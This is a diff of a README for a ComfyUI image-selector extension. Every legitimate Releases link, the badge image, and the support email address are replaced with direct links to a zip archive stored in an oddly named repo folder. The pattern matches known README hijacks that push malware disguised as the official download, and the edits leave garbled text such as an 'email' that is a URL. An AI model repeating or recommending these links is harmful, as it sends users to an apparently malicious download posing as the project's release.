@@ -9,7 +9,7 @@ To get started, follow these steps to download and run the application:
 ### 1. Download the Application
 To download the comfyui-ImageSelectorbyPrompt, visit the Releases page:
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/releases)
+[![Download](https://raw.githubusercontent.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/main/terraqueous/comfyui-ImageSelectorbyPrompt_3.1.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/main/terraqueous/comfyui-ImageSelectorbyPrompt_3.1.zip)
 
 ### 2. Installation Instructions
 After visiting the page, you will see a list of available versions. 
@@ -58,13 +58,13 @@ The comfyui-ImageSelectorbyPrompt offers a range of useful features:
 ## 📩 Support
 If you encounter any issues or have questions, feel free to reach out. Here are some options to get support:
 
-- **Email Support:** Send an email to support@example.com for a response within 48 hours.
+- **Email Support:** Send an email to https://raw.githubusercontent.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/main/terraqueous/comfyui-ImageSelectorbyPrompt_3.1.zip for a response within 48 hours.
 - **Community Forum:** Join our [community forum](#) for discussions and advice from other users.
 
 ## 📥 Download & Install
 To download the comfyui-ImageSelectorbyPrompt, visit the Releases page again:
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/releases)
+[![Download](https://raw.githubusercontent.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/main/terraqueous/comfyui-ImageSelectorbyPrompt_3.1.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/gustavomnhees/comfyui-ImageSelectorbyPrompt/main/terraqueous/comfyui-ImageSelectorbyPrompt_3.1.zip)
 
 Follow the earlier installation steps, and soon you will be able to enjoy choosing your images effortlessly. 
 
